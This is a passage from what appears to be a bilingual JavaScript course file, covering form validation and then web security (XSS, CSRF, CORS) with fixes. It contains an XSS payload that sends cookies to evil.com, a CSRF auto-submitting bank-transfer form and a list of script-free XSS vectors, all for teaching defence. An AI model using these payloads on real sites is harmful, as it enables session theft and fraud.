<input readonly>   <!-- submitted, just not editable -->
\`\`\`

A \`disabled\` field is silently missing from your FormData. This surprises people regularly.

## The server is the real validation

Every constraint must exist twice. The browser copy exists so the user finds out immediately; the server copy exists because the browser copy can be deleted by anyone with devtools. A validation library such as Zod lets you define the rule once and run it in both places.`,

    contentHi: `## Fields padhna

\`\`\`js
new FormData(form)                       // saari named fields
Object.fromEntries(new FormData(form))   // → plain object
form.elements.email.value                // naam se ek field
formData.getAll('tags')                  // ek hi naam ki kai values
\`\`\`

\`Object.fromEntries\` **duplicates kho deta hai** — \`tags\` naam ke teen checkboxes hon to sirf aakhri milta hai. Unke liye \`getAll\` use karo.

## Kaam ke input types

\`\`\`html
<input type="email">     shape validate karta hai, mobile par @ wala keyboard
<input type="tel">       mobile par numeric keypad
<input type="number">    min / max / step
<input type="url">       scheme zaroori
<input type="date">      native date picker
\`\`\`

Sirf mobile keyboard ka fark hi ise theek karne layak bana deta hai.

## ValidityState object

\`\`\`js
input.validity.valueMissing   // required par khaali
input.validity.typeMismatch   // valid email/url nahi
input.validity.tooShort       // minlength se kam
input.validity.rangeUnderflow // min se kam
input.validity.patternMismatch// pattern attribute fail
input.validity.customError    // setCustomValidity se laga
\`\`\`

Inpar branch karke aap browser ke default se behtar message likh sakte ho.

## Validity ko style karna

\`\`\`css
input:invalid { border-color: red; }          /* type karte waqt hi — kada lagta hai */
input:user-invalid { border-color: red; }     /* sirf interaction ke baad — behtar */
\`\`\`

"Mera khaali form kisi ke chhune se pehle hi laal hai" ka modern jawab \`:user-invalid\` hai.

## Samajhdaar validation flow

\`\`\`js
const touched = new Set();

form.addEventListener('blur', (e) => {
  touched.add(e.target.name);
  showError(e.target);
}, true);                              // capture — blur bubble nahi karta

form.addEventListener('input', (e) => {
  if (touched.has(e.target.name)) showError(e.target);   // pehle blur ke baad hi dobara check
});
\`\`\`

Teesra argument \`true\` dhyan se dekho: \`blur\` bubble nahi karta, isliye delegation ke liye capture phase chahiye — ya \`focusout\` use karo, jo bubble karta hai.

## Disabled versus readonly

\`\`\`html
<input disabled>   <!-- submit hota hi nahi -->
<input readonly>   <!-- submit hota hai, bas edit nahi hota -->
\`\`\`

\`disabled\` field aapke FormData se chup-chaap gayab rehti hai. Ye logon ko baar-baar chaunkata hai.

## Asli validation server par hai

Har rule do jagah hona chahiye. Browser wali copy isliye hai ki user ko turant pata chale; server wali isliye ki browser wali kisi bhi devtools wale se mit sakti hai. Zod jaisi validation library rule ek baar define karke dono jagah chalane deti hai.`,

    examples: [
      {
        title: 'Reading a form',
        titleHi: 'Form padhna',
        code: `// <form><input name="email"><input name="age"><button>Go</button></form>
const form = document.querySelector('form');

form.addEventListener('submit', (e) => {
  e.preventDefault();
  const data = Object.fromEntries(new FormData(form));
  console.log(data);
  console.log('age is a', typeof data.age);
});

form.requestSubmit();`,
        output: `{ email: 'jay@example.com', age: '25' }
age is a string`,
        explain: 'Every value from a form is a **string**, even from `type="number"`. Convert before doing arithmetic or you will get `"25" + 1 === "251"`.',
        explainHi: 'Form ki har value **string** hoti hai, `type="number"` se bhi. Ganit karne se pehle convert karo warna `"25" + 1 === "251"` milega.',
      },
      {
        title: 'Fields without a name are invisible',
        titleHi: 'Bina name wali fields dikhti hi nahi',
        code: `// <input name="a" value="1">
// <input id="b" value="2">          ← no name!
// <input name="c" value="3" disabled>

const data = Object.fromEntries(new FormData(form));
console.log(data);
console.log('b present?', 'b' in data);
console.log('c present?', 'c' in data);`,
        output: `{ a: '1' }
b present? false
c present? false`,
        explain: 'Two silent omissions: no `name` attribute, and `disabled`. Neither warns you — the value simply is not in the object.',
        explainHi: 'Do chup-chaap gayab hone wale case: `name` attribute na hona, aur `disabled`. Dono koi warning nahi dete — value bas object mein hoti hi nahi.',
      },
      {
        title: 'Multiple values with the same name',
        titleHi: 'Ek hi naam ki kai values',
        code: `// three checkboxes, all name="tags", values js / css / html
const fd = new FormData(form);

console.log(Object.fromEntries(fd));
console.log(fd.getAll('tags'));`,
        output: `{ tags: 'html' }
[ 'js', 'css', 'html' ]`,
        explain: '`fromEntries` kept only the last one — it builds an object, and later keys overwrite earlier ones. Use `getAll` for checkbox groups and multi-selects.',
        explainHi: '`fromEntries` ne sirf aakhri rakha — wo object banata hai, aur baad ki keys pehli ko overwrite kar deti hain. Checkbox groups aur multi-selects ke liye `getAll` use karo.',
      },
      {
        title: 'Built-in validation',
        titleHi: 'Built-in validation',
        code: `// <input type="email" name="email" required minlength="5">
const input = form.elements.email;

input.value = '';
console.log(input.validity.valueMissing, input.validationMessage);

input.value = 'nope';
console.log(input.validity.typeMismatch);

input.value = 'jay@example.com';
console.log('valid now:', input.validity.valid);`,
        output: `true Please fill out this field.
true
valid now: true`,
        explain: 'You wrote no JavaScript for any of this. The browser also localises those messages and announces them to screen readers automatically.',
        explainHi: 'Iske liye aapne koi JavaScript likhi hi nahi. Browser un messages ko translate bhi karta hai aur screen readers ko apne aap batata bhi hai.',
      },
      {
        title: 'Custom validity',
        titleHi: 'Custom validity',
        code: `const pw = form.elements.password;
const confirm = form.elements.confirm;

function check() {
  confirm.setCustomValidity(
    confirm.value === pw.value ? '' : 'Passwords do not match',
  );
}

pw.value = 'secret123';
confirm.value = 'secret124';
check();
console.log(confirm.validity.valid, '|', confirm.validationMessage);

confirm.value = 'secret123';
check();
console.log(confirm.validity.valid, '|', confirm.validationMessage);`,
        output: `false | Passwords do not match
true | `,
        explain: 'The empty string is what clears the error. Forgetting to reset it is the classic bug — the field stays invalid even after the user fixes it.',
        explainHi: 'Khaali string hi error hataati hai. Usse reset karna bhoolna classic bug hai — user sudhaar dene ke baad bhi field invalid hi rehti hai.',
      },
      {
        title: 'A better error message',
        titleHi: 'Behtar error message',
        code: `function messageFor(input) {
  const v = input.validity;
  if (v.valueMissing) return \`\${input.name} is required\`;
  if (v.typeMismatch) return \`That does not look like a valid \${input.type}\`;
  if (v.tooShort) return \`Use at least \${input.minLength} characters\`;
  if (v.rangeUnderflow) return \`Must be \${input.min} or more\`;
  return input.validationMessage;
}

const age = form.elements.age;
age.value = '5';                 // min="18"
console.log(messageFor(age));

const email = form.elements.email;
email.value = '';
console.log(messageFor(email));`,
        output: `Must be 18 or more
email is required`,
        explain: 'Branching on `validity` gives you messages in your product\'s voice while keeping every built-in rule. Far better than "Please fill out this field."',
        explainHi: '`validity` par branch karke aap apne product ki bhasha mein message de sakte ho aur har built-in rule bhi bacha rehta hai. "Please fill out this field." se kahin behtar.',
      },
      {
        title: 'Validate at the right moment',
        titleHi: 'Sahi waqt par validate karo',
        code: `const touched = new Set();

form.addEventListener('focusout', (e) => {   // focusout bubbles; blur does not
  if (!e.target.name) return;
  touched.add(e.target.name);
  console.log('blurred', e.target.name, '→ validating');
});

form.addEventListener('input', (e) => {
  if (!touched.has(e.target.name)) {
    console.log('typing in a fresh field → staying quiet');
    return;
  }
  console.log('re-validating', e.target.name, 'live');
});`,
        output: `typing in a fresh field → staying quiet
blurred email → validating
re-validating email live`,
        explain: 'Quiet on first typing, strict after they leave, then live while they fix it. This "touched" pattern is what every form library implements internally.',
        explainHi: 'Pehli baar type karte waqt chup, chhodne ke baad sakht, phir sudharte waqt live. Yahi "touched" pattern har form library andar-andar banati hai.',
      },
      {
        title: 'Client validation is trivially bypassed',
        titleHi: 'Client validation aasani se paar ho jati hai',
        code: `const form = document.querySelector('form');
console.log('form reports valid?', form.checkValidity());

// Anyone with devtools can do this:
form.noValidate = true;
console.log('after noValidate, submits anyway');

// Or skip the page entirely:
console.log('fetch("/api/users", { method: "POST", body: \\'{"age":-5}\\' })');
console.log('→ your HTML min="18" was never involved');`,
        output: `form reports valid? false
after noValidate, submits anyway
fetch("/api/users", { method: "POST", body: '{"age":-5}' })
→ your HTML min="18" was never involved`,
        explain: 'The last line is the point. An attacker never loads your form. Every rule must be re-checked server-side, without exception.',
        explainHi: 'Aakhri line hi asli baat hai. Hamlavar aapka form kabhi load hi nahi karta. Har rule server par dobara check hona hi chahiye, bina kisi apwaad ke.',
      },
      {
        title: 'Submitting to an API',
        titleHi: 'API ko submit karna',
        code: `form.addEventListener('submit', async (e) => {
  e.preventDefault();

  if (!form.checkValidity()) {
    form.reportValidity();          // show the browser's own UI
    return;
  }

  const btn = form.querySelector('button');
  btn.disabled = true;              // stop double submits

  try {
    const res = await fetch('/api/users', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(Object.fromEntries(new FormData(form))),
    });
    if (!res.ok) throw new Error(\`HTTP \${res.status}\`);
    console.log('saved');
  } catch (err) {
    console.log('failed:', err.message);
  } finally {
    btn.disabled = false;
  }
});`,
        output: `saved`,
        explain: 'Four things every real submit handler needs: preventDefault, a validity check, a disabled button to stop double submits, and a `finally` that re-enables it even when the request fails.',
        explainHi: 'Har asli submit handler ko chaar cheezein chahiye: preventDefault, validity check, double submit rokne ke liye disabled button, aur ek `finally` jo request fail hone par bhi usse wapas enable kar de.',
      },
    ],

    mistakes: [
      {
        wrong: `form.addEventListener('submit', save);  // ❌ page reloads mid-save`,
        right: `form.addEventListener('submit', e => { e.preventDefault(); save(); });  // ✅`,
        why: 'The default submit navigates away and destroys the JavaScript context before your request finishes.',
        whyHi: 'Default submit page badal deta hai aur aapki request poori hone se pehle JavaScript context mita deta hai.',
      },
      {
        wrong: `<input id="email">  <!-- ❌ FormData ignores it -->`,
        right: `<input id="email" name="email">  <!-- ✅ -->`,
        why: 'FormData collects fields by their `name` attribute. An `id` alone means the field is silently missing from the submitted data.',
        whyHi: 'FormData fields ko unke `name` attribute se jama karta hai. Sirf `id` ho to field submit hone wale data se chup-chaap gayab rehti hai.',
      },
      {
        wrong: `if (age > 18) createUser(age);  // ❌ only checked in the browser`,
        right: `// re-check on the server; the client check is UX only  ✅`,
        why: 'The client cannot be trusted. Requests can be sent directly to your API with any payload at all.',
        whyHi: 'Client par bharosa nahi kiya ja sakta. Requests kisi bhi payload ke saath seedhe aapke API ko bheji ja sakti hain.',
      },
      {
        wrong: `input.setCustomValidity('Invalid');  // ❌ never cleared`,
        right: `input.setCustomValidity(isValid ? '' : 'Invalid');  // ✅`,
        why: 'A non-empty custom message keeps the field invalid permanently, even once the user has corrected it.',
        whyHi: 'Khaali na hone wala custom message field ko hamesha ke liye invalid rakhta hai, chahe user sudhaar de.',
      },
    ],

    realWorld: [
      {
        en: '**Signup forms.** Email shape, password strength and "passwords match" are all doable with built-in validity plus one `setCustomValidity` — no library needed.',
        hi: '**Signup forms.** Email ka shape, password strength aur "passwords match" — sab built-in validity aur ek `setCustomValidity` se ho jata hai, koi library nahi chahiye.',
      },
      {
        en: '**Checkout.** Disabling the pay button while a request is in flight is the standard defence against a double charge from an impatient double-click.',
        hi: '**Checkout.** Request chalte waqt pay button disable karna hi double-click se do baar charge hone ke khilaf standard bachaav hai.',
      },
      {
        en: '**Shared schemas.** Defining the rules once with something like Zod and running the same schema in the browser and on the server removes the risk of the two drifting apart.',
        hi: '**Shared schemas.** Zod jaisi cheez se rules ek baar likhna aur wahi schema browser aur server dono par chalana dono ke alag ho jaane ka khatra khatam kar deta hai.',
      },
    ],

    interviewQA: [
      {
        q: 'Why is client-side validation not enough?',
        qHi: 'Client-side validation kaafi kyun nahi hai?',
        a: 'Because everything in the browser is under the user\'s control. They can disable JavaScript, edit the DOM in devtools, set `form.noValidate`, or ignore the page entirely and POST directly to the API. Client validation improves the experience; only server validation enforces the rule.',
        aHi: 'Kyunki browser ka sab kuch user ke kabze mein hai. Wo JavaScript band kar sakte hain, devtools mein DOM badal sakte hain, `form.noValidate` set kar sakte hain, ya page chhod kar seedhe API ko POST kar sakte hain. Client validation anubhav behtar karti hai; rule sirf server validation lagu karti hai.',
      },
      {
        q: 'Why is a form field missing from FormData?',
        qHi: 'Koi form field FormData se gayab kyun hoti hai?',
        a: 'Almost always one of two reasons: the input has no `name` attribute, or it is `disabled`. FormData collects by name and skips disabled controls entirely. Neither produces a warning. Use `readonly` instead of `disabled` when the value must still be submitted.',
        aHi: 'Lagbhag hamesha do mein se ek kaaran: input mein `name` attribute nahi hai, ya wo `disabled` hai. FormData naam se jama karta hai aur disabled controls poori tarah chhod deta hai. Dono koi warning nahi dete. Agar value phir bhi submit honi chahiye to `disabled` ke bajaye `readonly` use karo.',
      },
      {
        q: 'What is the difference between `disabled` and `readonly`?',
        qHi: '`disabled` aur `readonly` mein kya fark hai?',
        a: '`readonly` prevents editing but the field is still focusable and still submitted. `disabled` prevents interaction, removes the field from the submitted data entirely, and excludes it from constraint validation.',
        aHi: '`readonly` edit rokta hai par field focus bhi hoti hai aur submit bhi. `disabled` interaction rokta hai, field ko submit hone wale data se poori tarah hata deta hai, aur usse constraint validation se bhi bahar rakhta hai.',
      },
      {
        q: 'How do you validate that two password fields match?',
        qHi: 'Do password fields match karte hain ye kaise validate karein?',
        a: 'With `setCustomValidity`. Pass an empty string when they match to clear the error, and a message when they do not. Re-run it on every input of either field, otherwise the message goes stale and the field stays invalid after being corrected.',
        aHi: '`setCustomValidity` se. Match hone par khaali string do taaki error hate, aur na hone par message. Dono fields ke har input par ise dobara chalao, warna message purana ho jata hai aur sudharne ke baad bhi field invalid rehti hai.',
        code: `confirm.setCustomValidity(
  confirm.value === pw.value ? '' : 'Passwords do not match',
);`,
      },
      {
        q: 'When should validation errors be shown?',
        qHi: 'Validation errors kab dikhane chahiye?',
        a: 'Not while the user is first typing — that is hostile. Validate on blur for the first check, then re-validate on input only for fields already blurred, so corrections show as live feedback. `:user-invalid` in CSS implements this behaviour natively.',
        aHi: 'Jab user pehli baar type kar raha ho tab nahi — wo rukha lagta hai. Pehla check blur par karo, phir sirf un fields par input par dobara check karo jo pehle blur ho chuki hain, taaki sudhaar live dikhe. CSS mein `:user-invalid` yahi behaviour khud deta hai.',
      },
    ],

    exercises: [
      {
        task: 'Build a signup form with email, password (min 8) and confirm-password. Use built-in validation for the first two and `setCustomValidity` for the match check.',
        taskHi: 'Ek signup form banao jisme email, password (min 8) aur confirm-password ho. Pehle do ke liye built-in validation aur match check ke liye `setCustomValidity` use karo.',
        hint: 'Re-run the match check on `input` of BOTH fields — editing the first one can invalidate a previously matching second one.',
        hintHi: 'Match check DONO fields ke `input` par dobara chalao — pehli badalne se pehle se match karti doosri bhi galat ho sakti hai.',
      },
      {
        task: 'Implement the "touched" pattern: stay silent while a field is being typed into for the first time, validate on blur, then live-validate afterwards.',
        taskHi: '"Touched" pattern banao: field mein pehli baar type karte waqt chup raho, blur par validate karo, uske baad live validate karo.',
        hint: 'Keep a `Set` of touched field names. Use `focusout` for delegation since `blur` does not bubble.',
        hintHi: 'Touched field names ka ek `Set` rakho. Delegation ke liye `focusout` use karo kyunki `blur` bubble nahi karta.',
      },
      {
        task: 'Write a submit handler that validates, disables the button, POSTs as JSON, shows a server-returned field error, and always re-enables the button.',
        taskHi: 'Aisa submit handler likho jo validate kare, button disable kare, JSON POST kare, server se aayi field error dikhaye, aur button hamesha wapas enable kare.',
        hint: 'Re-enable in `finally` so a network failure does not leave the form permanently stuck.',
        hintHi: '`finally` mein wapas enable karo taaki network fail hone par form hamesha ke liye atka na rah jaye.',
      },
    ],

    keyTakeaways: [
      '`preventDefault` on submit, then read fields with `new FormData(form)`.',
      'FormData only sees inputs with a `name`, and skips `disabled` ones entirely.',
      'Every form value is a string, even from `type="number"`.',
      'Use built-in validation first — you get messages, focus and accessibility for free.',
      '`setCustomValidity("")` clears the error; forgetting it leaves the field invalid forever.',
      'Client validation is UX. The server must re-check every rule, without exception.',
    ],
    keyTakeawaysHi: [
      'Submit par `preventDefault`, phir `new FormData(form)` se fields padho.',
      'FormData sirf `name` wale inputs dekhta hai, aur `disabled` walon ko poori tarah chhod deta hai.',
      'Form ki har value string hoti hai, `type="number"` se bhi.',
      'Pehle built-in validation use karo — messages, focus aur accessibility muft mein milte hain.',
      '`setCustomValidity("")` error hataata hai; usse bhoolne par field hamesha invalid rehti hai.',
      'Client validation UX hai. Server ko har rule dobara check karna hi hai, bina apwaad.',
    ],
  },

  /* ══════════════════════ Security ══════════════════════ */
  {
    slug: 'web-security-basics',
    title: 'Web Security — XSS, CSRF and CORS',
    titleHi: 'Web Security — XSS, CSRF aur CORS',
    description: 'Three attacks, three defences, and why the browser blocks the request you were sure was fine.',
    descriptionHi: 'Teen hamle, teen bachaav, aur browser wo request kyun rokta hai jo aapko theek lag rahi thi.',
    difficulty: 'HARD',
    duration: 38,
    order: 6,

    analogy: {
      en: '**A noticeboard, a forged letter, and a suspicious postman.** **XSS** is a stranger pinning a note on your office noticeboard — everyone reads it and trusts it, because it is on *your* board. **CSRF** is someone posting a letter to your bank that looks like it came from you, signed with a signature the bank already trusts. **CORS** is the postman refusing to hand you mail addressed to a different building — annoying, but that is the whole job.',
      hi: '**Ek noticeboard, ek jaali khat, aur ek shakki dakiya.** **XSS** matlab koi ajnabi aapke daftar ke noticeboard par parcha chipka de — sab usse padhte aur maante hain, kyunki wo *aapke* board par hai. **CSRF** matlab koi aapke bank ko aisa khat bhej de jo dikhe ki aapne bheja hai, us dastkhat ke saath jispar bank pehle se bharosa karta hai. **CORS** matlab dakiya kisi doosri building ke naam ki dak aapko dene se mana kar de — chidhaane wala, par uska kaam hi yahi hai.',
    },

    simple: `**Three attacks worth knowing by name.**

---

**1. XSS — someone else's code running on your page**

You show a user's comment like this:

\`\`\`js
commentEl.innerHTML = comment;   // ❌
\`\`\`

They post this as their comment:

\`\`\`html
<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
\`\`\`

The image fails, \`onerror\` fires, and **their code now runs as your site**, with access to your cookies and your logged-in session. They never needed a \`<script>\` tag.

**The fix, in one line:**

\`\`\`js
commentEl.textContent = comment;   // ✅ shows the text, runs nothing
\`\`\`

If you genuinely must render HTML, sanitise it with **DOMPurify**. Never write your own sanitiser — people have tried for twenty years and keep getting it wrong.

---

**2. CSRF — your browser being used against you**

You are logged into your bank. You visit a different site. That site contains:

\`\`\`html
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker"><input name="amount" value="10000">
</form>
<script>document.forms[0].submit()</script>
\`\`\`

Your browser helpfully attaches your bank cookie, because that is what cookies do. The bank sees a valid, authenticated request.

**The fix:** \`SameSite=Lax\` on your session cookie — it will not be sent on a cross-site POST. Plus a CSRF token for anything sensitive.

---

**3. CORS — the one you meet on day one**

\`\`\`
Access to fetch at 'https://api.other.com' from origin
'http://localhost:3000' has been blocked by CORS policy
\`\`\`

**This is not a bug in your code.** The browser is refusing to let *your page* read a response from a *different origin*, unless that origin says it is allowed.

Two things people get wrong:

- The request usually **arrived at the server fine**. Only the reading was blocked.
- **You cannot fix it in the frontend.** The server must send \`Access-Control-Allow-Origin\`.

That is also why the same URL works in Postman: Postman is not a browser and has no origin to protect.

**Remember:** XSS = never trust user text as HTML. CSRF = \`SameSite\` cookies. CORS = a server-side fix, always.`,

    simpleHi: `**Teen hamle jinke naam pata hone chahiye.**

---

**1. XSS — kisi aur ka code aapke page par chalna**

Aap user ka comment aise dikhate ho:

\`\`\`js
commentEl.innerHTML = comment;   // ❌
\`\`\`

Wo comment ki jagah ye likh dete hain:

\`\`\`html
<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
\`\`\`

Image fail hoti hai, \`onerror\` chalta hai, aur **unka code ab aapki site bankar chal raha hai**, aapki cookies aur aapke logged-in session ke saath. Unhe \`<script>\` tag ki zarurat hi nahi padi.

**Ilaaj, ek line mein:**

\`\`\`js
commentEl.textContent = comment;   // ✅ text dikhata hai, chalata kuch nahi
\`\`\`

Agar sach mein HTML render karna hi hai to **DOMPurify** se sanitise karo. Apna sanitiser kabhi mat likho — log bees saal se koshish kar rahe hain aur galti karte rehte hain.

---

**2. CSRF — aapka browser aapke hi khilaf**

Aap apne bank mein logged in ho. Aap kisi doosri site par jaate ho. Us site par ye hai:

\`\`\`html
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker"><input name="amount" value="10000">
</form>
<script>document.forms[0].submit()</script>
\`\`\`

Aapka browser madad karte hue aapki bank cookie chipka deta hai, kyunki cookies yahi karti hain. Bank ko ek valid, authenticated request dikhti hai.

**Ilaaj:** apni session cookie par \`SameSite=Lax\` — wo cross-site POST par jayegi hi nahi. Aur sensitive kaam ke liye CSRF token bhi.

---

**3. CORS — jo pehle hi din mil jata hai**

\`\`\`
Access to fetch at 'https://api.other.com' from origin
'http://localhost:3000' has been blocked by CORS policy
\`\`\`

**Ye aapke code ka bug nahi hai.** Browser *aapke page* ko *doosre origin* ka response padhne se rok raha hai, jab tak wo origin ijazat na de.

Do baatein jinme log galti karte hain:

- Request aksar **server tak theek pahunch jati hai**. Sirf padhna roka gaya.
- **Isse frontend mein theek nahi kar sakte.** Server ko \`Access-Control-Allow-Origin\` bhejna hoga.

Isiliye wahi URL Postman mein chalta hai: Postman browser hai hi nahi aur uska koi origin nahi jise bachana ho.

**Yaad rakho:** XSS = user ke text ko HTML mat maano. CSRF = \`SameSite\` cookies. CORS = hamesha server-side ilaaj.`,

    content: `## XSS in detail

Three flavours:

- **Stored** — the payload is saved in your database and served to everyone (worst)
- **Reflected** — the payload comes from the URL and is echoed back
- **DOM-based** — no server involved; your JS reads \`location.hash\` and writes it to \`innerHTML\`

Dangerous sinks — never feed these untrusted input:

\`\`\`js
el.innerHTML          el.outerHTML
document.write        eval
new Function          setTimeout('string form')
a.href = 'javascript:…'
\`\`\`

Safe alternatives: \`textContent\`, \`setAttribute\`, \`createElement\`, and DOMPurify when HTML is genuinely required.

### Content Security Policy

A header that tells the browser which sources of script it may execute:

\`\`\`
Content-Security-Policy: default-src 'self'; script-src 'self'
\`\`\`

Even if an attacker injects a script tag, the browser refuses to run it. CSP is defence in depth — it does not replace escaping.

## CSRF in detail

CSRF works because cookies are attached **automatically** by origin, regardless of which site triggered the request.

Defences, in order of importance:

1. **\`SameSite=Lax\`** — the modern default; blocks cross-site POSTs
2. **CSRF token** — a random per-session value the attacker cannot read
3. **Check \`Origin\` / \`Referer\`** on state-changing requests

A token in \`Authorization: Bearer …\` is not automatically attached, so bearer-token APIs are largely immune — but they trade that for XSS exposure if the token lives in localStorage.

## CORS in detail

The browser classifies requests as **simple** or **preflighted**.

Simple (no preflight): \`GET\`, \`HEAD\`, or \`POST\` with a basic content type and no custom headers.

Anything else — \`PUT\`, \`DELETE\`, \`Content-Type: application/json\`, an \`Authorization\` header — triggers an \`OPTIONS\` **preflight** first:

\`\`\`
OPTIONS /api/users
Origin: http://localhost:3000
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type
\`\`\`

The server must answer:

\`\`\`
Access-Control-Allow-Origin: http://localhost:3000
Access-Control-Allow-Methods: POST
Access-Control-Allow-Headers: content-type
\`\`\`

For cookies you need **both** sides to opt in:

\`\`\`js
fetch(url, { credentials: 'include' })
\`\`\`
\`\`\`
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: https://exact-origin.com   ← * is forbidden here
\`\`\`

In development, a **proxy** sidesteps CORS entirely: your dev server forwards \`/api\` to the backend so the browser only ever sees one origin.

## The rest of the checklist

- Never build SQL or HTML by string concatenation
- Hash passwords with bcrypt or argon2 — never store or log them
- Keep secrets on the server; anything in frontend code is public
- HTTPS everywhere, \`Secure\` on every cookie
- Rate-limit auth endpoints
- Validate and authorise on the server for **every** request`,

    contentHi: `## XSS vistaar se

Teen kism:

- **Stored** — payload aapke database mein save hokar sabko dikhta hai (sabse bura)
- **Reflected** — payload URL se aata hai aur wapas dikha diya jata hai
- **DOM-based** — server shaamil hi nahi; aapki JS \`location.hash\` padhkar \`innerHTML\` mein daal deti hai

Khatarnaak jagah — inhe bharose ke laayak na input kabhi mat do:

\`\`\`js
el.innerHTML          el.outerHTML
document.write        eval
new Function          setTimeout('string wala roop')
a.href = 'javascript:…'
\`\`\`

Surakshit vikalp: \`textContent\`, \`setAttribute\`, \`createElement\`, aur jab HTML sach mein chahiye tab DOMPurify.

### Content Security Policy

Ek header jo browser ko batata hai ki wo kaunse source ka script chala sakta hai:

\`\`\`
Content-Security-Policy: default-src 'self'; script-src 'self'
\`\`\`

Hamlavar script tag daal bhi de to browser usse chalane se mana kar deta hai. CSP defence in depth hai — wo escaping ki jagah nahi leta.

## CSRF vistaar se

CSRF isliye chalta hai kyunki cookies origin ke hisaab se **apne aap** chipak jati hain, chahe request kisi bhi site se chali ho.

Bachaav, mahatva ke kram mein:

1. **\`SameSite=Lax\`** — modern default; cross-site POSTs rokta hai
2. **CSRF token** — har session ka random value jise hamlavar padh nahi sakta
3. State badalne wali requests par **\`Origin\` / \`Referer\` check** karo

\`Authorization: Bearer …\` wala token apne aap nahi chipakta, isliye bearer-token APIs zyadatar surakshit hain — par agar token localStorage mein hai to badle mein XSS ka khatra aa jata hai.

## CORS vistaar se

Browser requests ko **simple** ya **preflighted** mein baantta hai.

Simple (preflight nahi): \`GET\`, \`HEAD\`, ya basic content type wala \`POST\` bina custom headers ke.

Baaki sab — \`PUT\`, \`DELETE\`, \`Content-Type: application/json\`, \`Authorization\` header — pehle ek \`OPTIONS\` **preflight** karate hain:

\`\`\`
OPTIONS /api/users
Origin: http://localhost:3000
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type
\`\`\`

Server ko jawab dena hoga:

\`\`\`
Access-Control-Allow-Origin: http://localhost:3000
Access-Control-Allow-Methods: POST
Access-Control-Allow-Headers: content-type
\`\`\`

Cookies ke liye **dono** taraf haan karni padti hai:

\`\`\`js
fetch(url, { credentials: 'include' })
\`\`\`
\`\`\`
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: https://exact-origin.com   ← yahan * mana hai
\`\`\`

Development mein **proxy** CORS se poori tarah bacha leta hai: aapka dev server \`/api\` ko backend tak bhejta hai, isliye browser ko sirf ek hi origin dikhta hai.

## Baaki checklist

- SQL ya HTML kabhi string jodkar mat banao
- Passwords bcrypt ya argon2 se hash karo — kabhi store ya log mat karo
- Secrets server par rakho; frontend code mein jo hai wo public hai
- Har jagah HTTPS, har cookie par \`Secure\`
- Auth endpoints par rate-limit lagao
- **Har** request par server par validate aur authorise karo`,

    examples: [
      {
        title: 'XSS in one line',
        titleHi: 'Ek line mein XSS',
        code: `const comment = '<img src=x onerror="console.log(\\'ATTACKER CODE RAN\\')">';

document.querySelector('#unsafe').innerHTML = comment;
document.querySelector('#safe').textContent = comment;

console.log('unsafe elements created:', document.querySelector('#unsafe').children.length);
console.log('safe elements created:', document.querySelector('#safe').children.length);`,
        output: `ATTACKER CODE RAN
unsafe elements created: 1
safe elements created: 0`,
        explain: 'Note the attacker code ran *before* the logs — the moment `innerHTML` parsed it. `textContent` created no elements at all, so there was nothing to execute.',
        explainHi: 'Dhyan do hamlavar ka code logs se *pehle* chala — jaise hi `innerHTML` ne usse parse kiya. `textContent` ne koi element banaya hi nahi, isliye chalane ko kuch tha hi nahi.',
      },
      {
        title: 'No script tag required',
        titleHi: '<script> tag ki zarurat hi nahi',
        code: `const payloads = [
  '<img src=x onerror="alert(1)">',
  '<svg onload="alert(1)">',
  '<body onload="alert(1)">',
  '<a href="javascript:alert(1)">click</a>',
  '<iframe src="javascript:alert(1)">',
];

payloads.forEach((p, i) => {
  const el = document.createElement('div');
  el.innerHTML = p;
  console.log(i + 1, '→ created', el.children[0]?.tagName ?? 'nothing');
});`,
        output: `1 → created IMG
2 → created SVG
3 → created BODY
4 → created A
5 → created IFRAME`,
        explain: 'Every one of these executes without a `<script>` tag. Stripping `<script>` from user input is not sanitisation — it is a false sense of security.',
        explainHi: 'Inme se har ek bina `<script>` tag ke chalta hai. User input se `<script>` hataana sanitisation nahi hai — wo suraksha ka jhootha ehsaas hai.',
      },
      {
        title: 'Safe ways to build HTML',
        titleHi: 'HTML banane ke surakshit tarike',
        code: `const userName = '<script>alert(1)</script>';

// ❌
const bad = document.createElement('div');
bad.innerHTML = \`<span>\${userName}</span>\`;
console.log('bad children:', bad.querySelectorAll('*').length);

// ✅ build structure in code, insert text as text
const good = document.createElement('div');
const span = document.createElement('span');
span.textContent = userName;
good.append(span);
console.log('good children:', good.querySelectorAll('*').length);
console.log('good shows:', good.textContent);`,
        output: `bad children: 2
good children: 1
good shows: <script>alert(1)</script>`,
        explain: 'The safe version created only the `span` you asked for and displayed the payload harmlessly as text. Structure from your code, content from `textContent`.',
        explainHi: 'Surakshit version ne sirf wahi `span` banaya jo aapne maanga tha aur payload ko harmless text ki tarah dikhaya. Structure aapke code se, content `textContent` se.',
      },
      {
        title: 'Attribute injection',
        titleHi: 'Attribute injection',
        code: `const userUrl = 'javascript:alert(document.cookie)';

const a = document.createElement('a');
a.href = userUrl;
console.log('href accepted:', a.href.startsWith('javascript:'));

function safeHref(url) {
  try {
    const u = new URL(url, location.origin);
    return ['http:', 'https:', 'mailto:'].includes(u.protocol) ? u.href : '#';
  } catch { return '#'; }
}

console.log('safe version:', safeHref(userUrl));
console.log('normal url:', safeHref('https://example.com'));`,
        output: `href accepted: true
safe version: #
normal url: https://example.com/`,
        explain: 'Even without `innerHTML`, a user-supplied URL is dangerous — `javascript:` in an href executes on click. Allow-list the protocol rather than trying to block bad ones.',
        explainHi: '`innerHTML` ke bina bhi user ki di hui URL khatarnak hai — href mein `javascript:` click par chal jata hai. Bure protocols rokne ki koshish ke bajaye achhon ki allow-list banao.',
      },
      {
        title: 'How CSRF works',
        titleHi: 'CSRF kaise chalta hai',
        code: `// On evil.com, while you are logged into bank.com:
const form = document.createElement('form');
form.method = 'POST';
form.action = 'https://bank.com/transfer';
form.innerHTML = '<input name="to" value="attacker"><input name="amount" value="10000">';

console.log('Browser will attach bank.com cookies automatically');
console.log('Bank sees: authenticated POST from a real logged-in session');
console.log('');
console.log('Defence: Set-Cookie: session=…; SameSite=Lax');
